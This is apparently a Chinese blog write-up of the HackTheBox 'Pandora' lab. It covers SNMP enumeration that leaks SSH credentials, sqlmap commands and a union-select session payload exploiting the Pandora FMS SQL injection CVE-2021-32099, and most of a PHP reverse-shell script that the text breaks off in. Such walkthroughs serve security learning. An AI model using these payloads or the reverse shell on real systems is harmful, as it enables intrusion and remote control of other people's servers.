        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>利用靶场来练习，可以很好的考验自己所学知识。此次玩的是<a href="https://www.hackthebox.com/">hackthebox</a>上面的Pandora盒子，与我之前打过的几个靶机有些共同的特点，考验了CVE利用能力，总的来说还是学到了不少东西。<br>过程概览：</p><ul><li>TCP扫描无果改为UDP扫描发现SNMP服务</li><li>扫描SNMP泄露的信息发现账号和密码</li><li>登录后发现有个内部的服务，通过端口转发，发现是Pandora FMS系统</li><li>查询Pandora的历史漏洞，发现存在SQL注入</li><li>利用SQL注入登录管理后台</li><li>后台上传shell得到普通flag</li><li>查看特权文件发现/usr/bin/pandora_backup存在环境变量注入，利用获取root shell<h1 id="信息发现"><a href="#信息发现" class="headerlink" title="信息发现"></a>信息发现</h1>TCP扫描发现开启了80和22端口。<br><img src="https://s2.loli.net/2022/01/29/qSZ6NK7M543bQWO.png" alt="image.png"><br>目录扫描发现存在目录遍历，但是没有什么特殊的文件，都是一些静态文件。<br><code>nmap -sC -sV -sU 10.10.11.136</code>进行UDP端口扫描。端口的服务是分TCP和UDP的，当时没有想到这个点。<br><img src="https://s2.loli.net/2022/01/29/SfWvxEntolBzrme.png" alt="image.png"><br>发现开启了SNMP服务，通过工具来扫描支持SNMP协议其他设备的一些信息，来看看存不存在敏感的信息。<br><code>snmpwalk -v 2c -c public 10.10.11.136 &gt; snmp.txt</code>扫描设备的一些信息。<br><img src="https://s2.loli.net/2022/01/29/9W7tqbUZYkBgjFA.png" alt="image.png"><br>发现存在用户名<mark class="hl-label blue">daniel</mark> 密码<mark class="hl-label blue">HotelBabylon23</mark> <br>登录后使用<code>netstat -antl</code>查看开放的端口，发现本地80端口开放了服务。<br><code>sudo ssh -L 80:127.0.0.1:80 daniel@10.10.11.136</code>在本地主机上输入命令，将本地的80端口映射到远程主机本地的80端口上，访问<code>http://127.0.0.1:80</code>发现是Pandora FMS服务。<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="普通用户"><a href="#普通用户" class="headerlink" title="普通用户"></a>普通用户</h2>首页显示的Pandora FMS版本为7.0NG.742_FIX_PERL2020存在<a href="https://www.cve.org/CVERecord?id=CVE-2021-32099">SQL注入漏洞</a>。<h3 id="漏洞解释"><a href="#漏洞解释" class="headerlink" title="漏洞解释"></a>漏洞解释</h3><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>/include/chart_generator.php</span></div>    <div class="hide-content"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">71</span>  <span class="comment">// Try to initialize session using existing php session id.</span></span><br><span class="line"><span class="number">72</span>  <span class="variable">$user</span> = <span class="keyword">new</span> PandoraFMS\User([<span class="string">&#x27;phpsessionid&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;session_id&#x27;</span>]]);</span><br><span class="line"><span class="number">73</span>  <span class="keyword">if</span> (check_login(<span class="literal">false</span>) === <span class="literal">false</span>) &#123;   </span><br><span class="line"><span class="number">74</span>     <span class="comment">// Error handler.</span></span><br><span class="line"> ⋮</span><br><span class="line"><span class="number">96</span>  &#125;</span><br><span class="line"><span class="number">97</span></span><br><span class="line"><span class="number">98</span>  <span class="comment">// Access granted.</span></span><br></pre></td></tr></table></figure></div></div><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>/include/lib/User.php</span></div>    <div class="hide-content"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">60</span>  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">61  </span>&#123;</span><br><span class="line"> ⋮</span><br><span class="line"><span class="number">68</span>     <span class="keyword">if</span> (is_array(<span class="variable">$data</span>) === <span class="literal">true</span>) &#123;</span><br><span class="line"><span class="number">69</span>        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="string">&#x27;phpsessionid&#x27;</span>]) === <span class="literal">true</span>) &#123;</span><br><span class="line"><span class="number">70</span>           <span class="keyword">$this</span>-&gt;sessions[<span class="variable">$data</span>[<span class="string">&#x27;phpsessionid&#x27;</span>]] = <span class="number">1</span>;</span><br><span class="line"><span class="number">71</span>           <span class="variable">$info</span> = \db_get_row_filter(</span><br><span class="line"><span class="number">72</span>              <span class="string">&#x27;tsessions_php&#x27;</span>,</span><br><span class="line"><span class="number">73</span>              [<span class="string">&#x27;id_session&#x27;</span> =&gt; <span class="variable">$data</span>[<span class="string">&#x27;phpsessionid&#x27;</span>]]</span><br><span class="line"><span class="number">74</span>          );</span><br><span class="line"><span class="number">75</span></span><br><span class="line"><span class="number">76</span>         <span class="keyword">if</span> (<span class="variable">$info</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="number">77</span>            <span class="comment">// Process.</span></span><br><span class="line"><span class="number">78</span>            <span class="variable">$session_data</span> = session_decode(<span class="variable">$info</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="number">79</span>            <span class="keyword">$this</span>-&gt;idUser = <span class="variable">$_SESSION</span>[<span class="string">&#x27;id_usuario&#x27;</span>];</span><br><span class="line"><span class="number">80</span></span><br><span class="line"><span class="number">81</span>            <span class="comment">// Valid session.</span></span><br><span class="line"><span class="number">82</span>            <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line"><span class="number">83</span>         &#125;</span><br></pre></td></tr></table></figure></div></div><code>chart_generator.php</code>用从客户端收到的<em>session_id</em>来初始化User对象，并且验证是在<code>User.php</code>中进行的。验证的过程大致如下所示：<div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TD    A[phpsessionid] --&gt;|tsessions_php表| B(查询满足条件的数据)    B --&gt; C(解码序列化的session数据)    C--&gt; |填充到| D[$_SESSION全局变量]    D --&gt; E(验证session)  </pre></div>先调用了<code>db_get_row_filter</code>以传进来的<em>session_id</em>为条件获取数据，之后调用<code>session_decode()</code>查询，利用返回的<code>data</code>列进行session的反序列化，然后填充到<code>SESSION</code>中，最后进行身份的验证。此处由于没有对用户的输入进行很好的过滤，导致了SQL注入漏洞，具体原因可以查看此<a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained">链接</a>。<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3>由漏洞解析阶段可知最后的身份验证是根据data列来进行的，所以我们需要将data列设置为具有较高权限用户的序列化session。<br><code>sqlmap -u http://127.0.0.1/pandora_console/include/chart_generator.php?session_id= --dbms=mysql --current-db</code>：获取到当前数据库名为<em>pandora</em>。<br><code>sqlmap -u http://127.0.0.1/pandora_console/include/chart_generator.php?session_id= --dbms=mysql -D pandora --tables</code>：获取<em>pandora</em>数据库里面的所有表名。<div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>表名</span></div>    <div class="hide-content"><p>Database: pandora<br>[178 tables]<br>+————————————+<br>| taddress                           |<br>| taddress_agent                     |<br>| tagent_access                      |<br>| tagent_custom_data                 |<br>| tagent_custom_fields               |<br>| tagent_custom_fields_filter        |<br>| tagent_module_inventory            |<br>| tagent_module_log                  |<br>| tagent_repository                  |<br>| tagent_secondary_group             |<br>| tagente                            |<br>| tagente_datos                      |<br>| tagente_datos_inc                  |<br>| tagente_datos_inventory            |<br>| tagente_datos_log4x                |<br>| tagente_datos_string               |<br>| tagente_estado                     |<br>| tagente_modulo                     |<br>| talert_actions                     |<br>| talert_commands                    |<br>| talert_snmp                        |<br>| talert_snmp_action                 |<br>| talert_special_days                |<br>| talert_template_module_actions     |<br>| talert_template_modules            |<br>| talert_templates                   |<br>| tattachment                        |<br>| tautoconfig                        |<br>| tautoconfig_actions                |<br>| tautoconfig_rules                  |<br>| tcategory                          |<br>| tcluster                           |<br>| tcluster_agent                     |<br>| tcluster_item                      |<br>| tcollection                        |<br>| tconfig                            |<br>| tconfig_os                         |<br>| tcontainer                         |<br>| tcontainer_item                    |<br>| tcredential_store                  |<br>| tdashboard                         |<br>| tdatabase                          |<br>| tdeployment_hosts                  |<br>| tevent_alert                       |<br>| tevent_alert_action                |<br>| tevent_custom_field                |<br>| tevent_extended                    |<br>| tevent_filter                      |<br>| tevent_response                    |<br>| tevent_rule                        |<br>| tevento                            |<br>| textension_translate_string        |<br>| tfiles_repo                        |<br>| tfiles_repo_group                  |<br>| tgis_data_history                  |<br>| tgis_data_status                   |<br>| tgis_map                           |<br>| tgis_map_connection                |<br>| tgis_map_has_tgis_map_con          |<br>| tgis_map_layer                     |<br>| tgis_map_layer_groups              |<br>| tgis_map_layer_has_tagente         |<br>| tgraph                             |<br>| tgraph_source                      |<br>| tgraph_source_template             |<br>| tgraph_template                    |<br>| tgroup_stat                        |<br>| tgrupo                             |<br>| tincidencia                        |<br>| titem                              |<br>| tlanguage                          |<br>| tlayout                            |<br>| tlayout_data                       |<br>| tlayout_template                   |<br>| tlayout_template_data              |<br>| tlink                              |<br>| tlocal_component                   |<br>| tlog_graph_models                  |<br>| tmap                               |<br>| tmensajes                          |<br>| tmetaconsole_agent                 |<br>| tmetaconsole_agent_secondary_group |<br>| tmetaconsole_event                 |<br>| tmetaconsole_event_history         |<br>| tmetaconsole_setup                 |<br>| tmigration_module_queue            |<br>| tmigration_queue                   |<br>| tmodule                            |<br>| tmodule_group                      |<br>| tmodule_inventory                  |<br>| tmodule_relationship               |<br>| tmodule_synth                      |<br>| tnetflow_filter                    |<br>| tnetflow_report                    |<br>| tnetflow_report_content            |<br>| tnetwork_component                 |<br>| tnetwork_component_group           |<br>| tnetwork_map                       |<br>| tnetwork_matrix                    |<br>| tnetwork_profile                   |<br>| tnetwork_profile_component         |<br>| tnetworkmap_ent_rel_nodes          |<br>| tnetworkmap_enterprise             |<br>| tnetworkmap_enterprise_nodes       |<br>| tnews                              |<br>| tnota                              |<br>| tnotification_group                |<br>| tnotification_source               |<br>| tnotification_source_group         |<br>| tnotification_source_group_user    |<br>| tnotification_source_user          |<br>| tnotification_user                 |<br>| torigen                            |<br>| tpassword_history                  |<br>| tperfil                            |<br>| tphase                             |<br>| tplanned_downtime                  |<br>| tplanned_downtime_agents           |<br>| tplanned_downtime_modules          |<br>| tplugin                            |<br>| tpolicies                          |<br>| tpolicy_agents                     |<br>| tpolicy_alerts                     |<br>| tpolicy_alerts_actions             |<br>| tpolicy_collections                |<br>| tpolicy_groups                     |<br>| tpolicy_modules                    |<br>| tpolicy_modules_inventory          |<br>| tpolicy_plugins                    |<br>| tpolicy_queue                      |<br>| tprofile_view                      |<br>| tprovisioning                      |<br>| tprovisioning_rules                |<br>| trecon_script                      |<br>| trecon_task                        |<br>| trel_item                          |<br>| tremote_command                    |<br>| tremote_command_target             |<br>| treport                            |<br>| treport_content                    |<br>| treport_content_item               |<br>| treport_content_item_temp          |<br>| treport_content_sla_com_temp       |<br>| treport_content_sla_combined       |<br>| treport_content_template           |<br>| treport_custom_sql                 |<br>| treport_template                   |<br>| treset_pass                        |<br>| treset_pass_history                |<br>| tserver                            |<br>| tserver_export                     |<br>| tserver_export_data                |<br>| tservice                           |<br>| tservice_element                   |<br>| tsesion                            |<br>| tsesion_extended                   |<br>| tsessions_php                      |<br>| tskin                              |<br>| tsnmp_filter                       |<br>| ttag                               |<br>| ttag_module                        |<br>| ttag_policy_module                 |<br>| ttipo_modulo                       |<br>| ttransaction                       |<br>| ttrap                              |<br>| ttrap_custom_values                |<br>| tupdate                            |<br>| tupdate_journal                    |<br>| tupdate_package                    |<br>| tupdate_settings                   |<br>| tuser_double_auth                  |<br>| tuser_task                         |<br>| tuser_task_scheduled               |<br>| tusuario                           |<br>| tusuario_perfil                    |<br>| tvisual_console_elements_cache     |<br>| twidget                            |<br>| twidget_dashboard                  |<br>+————————————+</p></div></div>由于原代码中是从<code>tsessions_php</code>表中获取数据的，所以我们查看该表的数据，<code>sqlmap -u http://127.0.0.1/pandora_console/include/chart_generator.php?session_id= --dbms=mysql -D pandora -T tsessions_php -C data,id_session --dump </code>，发现存在admin的session序列化数据。<br><img src="https://s2.loli.net/2022/01/31/LCqOIgdopsMNhQX.png" alt="image.png"><br>之后可以利用SQL注入来为<em>data</em>列赋值，<code>http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=%27union%20select%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data--+</code>。<br>之后重新访问控制台界面，我们就会以admin的身份进入到后台。<br><img src="https://s2.loli.net/2022/01/31/wzYFbrCJ2Rne1c5.png" alt="image.png"><br>上传文件的地点：<br><img src="https://s2.loli.net/2022/01/31/R6wLDGl4PoB2Fyv.png" alt="image.png"><br>之后通过访问界面logo知道可以通过<code>http://127.0.0.1/pandora_console/images/</code>访问到上传的文件，所以可以在此点上传php webshell。<div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>php_shell</span></div>    <div class="hide-content"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span></span><br><span class="line"><span class="comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></span><br><span class="line"><span class="comment">// for any actions performed using this tool.  The author accepts no liability</span></span><br><span class="line"><span class="comment">// for damage caused by this tool.  If these terms are not acceptable to you, then</span></span><br><span class="line"><span class="comment">// do not use this tool.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// In all other respects the GPL version 2 applies:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This program is free software; you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">// it under the terms of the GNU General Public License version 2 as</span></span><br><span class="line"><span class="comment">// published by the Free Software Foundation.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment">// GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// You should have received a copy of the GNU General Public License along</span></span><br><span class="line"><span class="comment">// with this program; if not, write to the Free Software Foundation, Inc.,</span></span><br><span class="line"><span class="comment">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></span><br><span class="line"><span class="comment">// for any actions performed using this tool.  If these terms are not acceptable to</span></span><br><span class="line"><span class="comment">// you, then do not use this tool.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// You are encouraged to send comments, improvements or suggestions to</span></span><br><span class="line"><span class="comment">// me at pentestmonkey@pentestmonkey.net</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Description</span></span><br><span class="line"><span class="comment">// -----------</span></span><br><span class="line"><span class="comment">// This script will make an outbound TCP connection to a hardcoded IP and port.</span></span><br><span class="line"><span class="comment">// The recipient will be given a shell running as the current user (apache normally).</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Limitations</span></span><br><span class="line"><span class="comment">// -----------</span></span><br><span class="line"><span class="comment">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span></span><br><span class="line"><span class="comment">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span></span><br><span class="line"><span class="comment">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Usage</span></span><br><span class="line"><span class="comment">// -----</span></span><br><span class="line"><span class="comment">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span></span><br><span class="line"></span><br><span class="line">set_time_limit (<span class="number">0</span>);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;  <span class="comment">// CHANGE THIS</span></span><br><span class="line"><span class="variable">$port</span> = <span class="number">1234</span>;       <span class="comment">// CHANGE THIS</span></span><br><span class="line"><span class="variable">$chunk_size</span> = <span class="number">1400</span>;</span><br><span class="line"><span class="variable">$write_a</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$error_a</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$debug</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Daemonise ourself if possible to avoid zombies later</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></span><br><span class="line"><span class="comment">// our php process and avoid zombies.  Worth a try...</span></span><br><span class="line"><span class="keyword">if</span> (function_exists(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line"><span class="comment">// Fork and have the parent process exit</span></span><br><span class="line"><span class="variable">$pid</span> = pcntl_fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pid</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">printit(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make the current process a session leader</span></span><br><span class="line"><span class="comment">// Will only succeed if we forked</span></span><br><span class="line"><span class="keyword">if</span> (posix_setsid() == -<span class="number">1</span>) &#123;</span><br><span class="line">printit(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$daemon</span> = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">printit(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Change to a safe directory</span></span><br><span class="line">chdir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove any umask we inherited</span></span><br><span class="line">umask(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Do the reverse shell...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Open reverse connection</span></span><br><span class="line"><span class="variable">$sock</span> = fsockopen(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">printit(<span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Spawn shell process</span></span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = proc_open(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_resource(<span class="variable">$process</span>)) &#123;</span><br><span class="line">printit(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set everything to non-blocking</span></span><br><span class="line"><span class="comment">// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t</span></span><br><span class="line">stream_set_blocking(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking(<span class="variable">$sock</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">printit(<span class="string">&quot;Successfully opened reverse shell to <span class="subst">$ip</span>:<span class="subst">$port</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// Check for end of TCP connection</span></span><br><span class="line"><span class="keyword">if</span> (feof(<span class="variable">$sock</span>)) &#123;</span><br><span class="line">printit(<span class="string">&quot;ERROR: Shell connection terminated&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check for end of STDOUT</span></span><br><span class="line"><span class="keyword">if</span> (feof(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">printit(<span class="string">&quot;ERROR: Shell process terminated&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait until a command is end down $sock, or some</span></span><br><span class="line"><span class="comment">// command output is available on STDOUT or STDERR</span></span><br><span class="line"><span class="variable">$read_a</span> = <span class="keyword">array</span>(<span class="variable">$sock</span>, <span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="variable">$num_changed_sockets</span> = stream_select(<span class="variable">$read_a</span>, <span class="variable">$write_a</span>, <span class="variable">$error_a</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the TCP socket, send</span></span><br><span class="line"><span class="comment">// data to process&#x27;s STDIN</span></span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line"><span class="variable">$input</span> = fread(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;SOCK: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="variable">$input</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the process&#x27;s STDOUT</span></span><br><span class="line"><span class="comment">// send data down tcp connection</span></span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDOUT READ&quot;</span>);</span><br><span class="line"><span class="variable">$input</span> = fread(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDOUT: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the 